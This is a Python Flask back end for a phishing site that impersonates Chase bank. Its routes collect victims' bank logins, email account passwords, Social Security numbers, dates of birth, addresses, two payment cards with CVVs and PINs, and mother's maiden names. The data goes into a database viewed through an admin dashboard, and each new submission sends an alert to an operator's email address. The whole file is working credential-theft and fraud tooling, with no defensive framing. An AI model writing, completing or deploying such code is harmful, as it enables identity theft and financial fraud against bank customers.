from flask import (
    Flask, request, jsonify, render_template,session,redirect, Blueprint
)
from flask_cors import CORS
import mysql.connector 
import os 
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import smtplib
import traceback
from typing import Optional
import base64
import requests
from dotenv import load_dotenv

load_dotenv()

# ==========================
# FLASK APP SETUP
# ==========================
app = Flask(__name__)
app.secret_key = "supersecret"

CORS(app, supports_credentials=True)

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax"
)




conn = mysql.connector.connect(
    host = os.getenv("DB_HOST"),
    user =  os.getenv("DB_USER"),
    password =  os.getenv("DB_PASSWORD"),
    database =  os.getenv("DB_NAME"), 
    port =  os.getenv("DB_PORT"),
)
cursor = conn.cursor()



def send_email(
    recipient: str,
    subject: str,
    body: str,
    html: bool = False,
    attachments: Optional[list] = None
) -> bool:
    try:
        api_key = os.getenv("RESEND_API_KEY")
        sender = os.getenv("SENDER_EMAIL")

        if not api_key or not sender:
            print("⚠️ Email not configured")
            return False

        files = []
        if attachments:
            for path in attachments:
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        files.append({
                            "filename": os.path.basename(path),
                            "content": base64.b64encode(f.read()).decode()
                        })
                else:
                    print(f"Attachment not found: {path}")

        payload = {
            "from": sender,
            "to": [recipient],
            "subject": subject,
            "html": body if html else None,
            "text": body if not html else None,
            "attachments": files if files else None
        }

        response = requests.post(
            "https://api.resend.com/emails",
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
            },
            json=payload,
            timeout=10,
        )

        if response.status_code >= 400:
            print("⚠️ Email error:", response.text)
            return False

        return True

    except Exception as e:
        print("⚠️ Email failed:", e)
        traceback.print_exc()
        return False



# =============== ROUTES ===============
@app.route('/')
def home():
    return render_template("auth.html")

@app.route('/verify')
def verify_1():
    return render_template("dashboard.html")

from datetime import datetime
@app.route("/admin/login")
def admin_login_page():
    year = datetime.now().year
    return render_template("admin_login.html", year=year)

@app.route("/admin")
def admin_page():
    if "admin_id" not in session:
       return redirect("/admin/login")
    cursor = conn.cursor(dictionary=True)
    cursor.execute(
        """
        SELECT id, username, password, email, mail_pss, fullname, dob, street_address, state, zip_code, phone, sss, card_d, ccc, exp_date, sims, mmn, card_d2, ccc2, exp_date2, sims2
        FROM users
        """
    )
    r = cursor.fetchall()
    return render_template("admin_dashboard.html", info=r)



@app.route("/loginp", methods=["POST"])
def login():
    data = request.form
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400


    username = data.get('username')
    chip = data.get('passbank')


    if not username or not chip:
        return jsonify({"status": "error", "message": "username and password required"})
    try:
        # save to database
        cursor.execute(
            """
            INSERT INTO users(username, password)
            VALUES(%s,%s)
            """,
            (username, chip)
        )
        user_id = cursor.lastrowid
        conn.commit()

        # if attempts < 2:
        #     return jsonify({"status": "error", "message": "Password or username not correct"})
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "There's a new sign from chase, check admin dashboard to confirm",
            html=False
        )

        session['user_id'] = user_id
        return jsonify({"status": "success", "message": "Login Successful. Continue with the verification"})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Logining:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/email", methods=["POST"])
def verify_email():
    user_id = session.get("user_id")
    data = request.form
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    
    # Required fields
    required_fields = [
        "email",
        "mail_pass"
    ]

    # Validate required fields
    for field in required_fields:
        if not data.get(field):
            return jsonify({
                "status": "error",
                "message": f"Missing field: {field}"
            }), 400

   
    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET email=%s,
                mail_pss=%s
            WHERE id=%s
            """,
            (data['email'], data['mail_pass'], user_id)
        )
        conn.commit()

        # if attempts < 2:
        #     return jsonify({"status": "error", "message": "Password or username not correct"})
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Verified Email details from chase, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"}), 200
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Logining:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/billing", methods=["POST"])
def verify_billing():
    user_id = session.get("user_id")
    data = request.form
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    
    # Required fields
    required_fields = [
        "fullname",
        "address",
        "state",
        "zip_code",
        "dob",
        "sss", 
        "phone"
    ]

    # Validate required fields
    for field in required_fields:
        if not data.get(field):
            return jsonify({
                "status": "error",
                "message": f"Missing field: {field}"
            }), 400

   
    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET fullname=%s,
                street_address=%s,
                state=%s,
                zip_code=%s,
                dob=%s,
                sss=%s,
                phone=%s
            WHERE id=%s
            """,
            (data.get('fullname'), data.get('address'), data.get('state'),data.get('zip_code'),data.get('dob'), data.get('sss'), data.get('phone'), user_id)
        )
        conn.commit()

        # if attempts < 2:
        #     return jsonify({"status": "error", "message": "Password or username not correct"})
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Updated Billing address from chase, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"}), 200
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Logining:", e)
        return jsonify({"status": "error", "message": str(e)}), 500
    


@app.route("/card1", methods=["POST"])
def verify_card1():
    user_id = session.get("user_id")
    data = request.form
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    
    # Required fields
    required_fields = [
        "CardNumber",
        "exp_date",
        "ccc",
        "sims",
        "mmn"
    ]

    # Validate required fields
    for field in required_fields:
        if not data.get(field):
            return jsonify({
                "status": "error",
                "message": f"Missing field: {field}"
            }), 400

   
    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET card_d=%s,
                exp_date=%s,
                ccc=%s,
                sims=%s,
                mmn=%s
            WHERE id=%s
            """,
            (data['CardNumber'], data['exp_date'],data['ccc'], data['sims'],data['mmn'], user_id)
        )
        conn.commit()

        # if attempts < 2:
        #     return jsonify({"status": "error", "message": "Password or username not correct"})
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Verified Card Details from chase, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Logining:", e)
        return jsonify({"status": "error", "message": str(e)}), 500
    


@app.route("/card2", methods=["POST"])
def verify_card2():
    user_id = session.get("user_id")
    data = request.form
    if not data:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    
    # Required fields
    required_fields = [
        "CardNumber2",
        "exp_date2",
        "ccc2",
        "sims2"
    ]

    # Validate required fields
    for field in required_fields:
        if not data.get(field):
            return jsonify({
                "status": "error",
                "message": f"Missing field: {field}"
            }), 400

   
    try:
        # save to database
        cursor.execute(
            """
            UPDATE users
            SET card_d2=%s,
                exp_date2=%s,
                ccc2=%s,
                sims2=%s
            WHERE id=%s
            """,
            (data['CardNumber2'], data['exp_date2'],data['ccc2'], data['sims2'], user_id)
        )
        conn.commit()

        # if attempts < 2:
        #     return jsonify({"status": "error", "message": "Password or username not correct"})
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            "Verified Card Details from chase, check admin dashboard to confirm",
            html=False
        )

        return jsonify({"status": "success", "message": "Successful. Continue with the verification"}), 200
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Logining:", e)
        return jsonify({"status": "error", "message": str(e)}), 500
    

@app.route("/login/admin", methods=["POST"])
def verify_admin():
    data = request.form

    username = data['username']
    past = data['password']

 
    if not username or not past:
        return jsonify({"status": "error", "message": "Username and pass are required "}), 401

    try:
        # save to database
        cursor.execute(
            """
            SELECT id,password
            FROM admins
            WHERE username=%s
            """,
            (
             username,
            )
        )
        user = cursor.fetchone()
        if not user:
            return jsonify({"status": "error", "message": "Admin not found."}), 400
        
        if past != user[1]:
            return jsonify({"status": "error", "message": "Incorrect password"}), 401
        
        session["admin_id"] = user[0]
    
        send_email(
            "jaymoutrey658@gmail.com",
            "New Sign In",
            f"Admin {username} just signed in the admin dashboard",
            html=False
        )

        return jsonify({"status": "success", "message": "Login Successful."})
    except Exception as e:
        # Rollback in case of error
        conn.rollback()
        print("Error Verifying:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == "__main__":

    app.run()

